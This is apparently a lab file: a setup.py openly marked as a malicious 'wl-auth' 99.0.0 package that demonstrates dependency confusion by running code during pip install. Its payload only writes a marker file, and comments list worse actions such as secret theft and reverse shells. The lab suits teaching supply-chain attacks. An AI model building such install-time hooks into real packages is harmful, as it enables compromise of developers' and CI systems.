"""Malicious setup.py for dependency confusion lab.

This is an INTENTIONALLY malicious package for educational purposes.
It demonstrates how code execution happens during pip install via setup.py.
"""
import subprocess
from setuptools import setup

# ====================================================================
# MALICIOUS SETUP.PY - EDUCATIONAL ONLY
#
# This runs during `pip install` -- before the package is even usable.
# In a real attack, this could:
#   - Exfiltrate environment variables (AWS keys, CI tokens)
#   - Download and execute a reverse shell
#   - Modify other installed packages
#   - Install a persistent backdoor
#
# For this lab, it just writes a marker file to prove code execution.
# ====================================================================

marker_lines = [
    "COMPROMISED",
    "[ATTACK] Malicious wl-auth 99.0.0 executed code during pip install!",
    "[ATTACK] In a real attack, this could exfiltrate secrets, install backdoors, etc.",
]

with open("/tmp/dependency-confusion-pwned", "w") as f:
    f.write("\n".join(marker_lines) + "\n")

setup(
    name="wl-auth",
    version="99.0.0",
    description="wl-auth",
    py_modules=["wl_auth"],
)
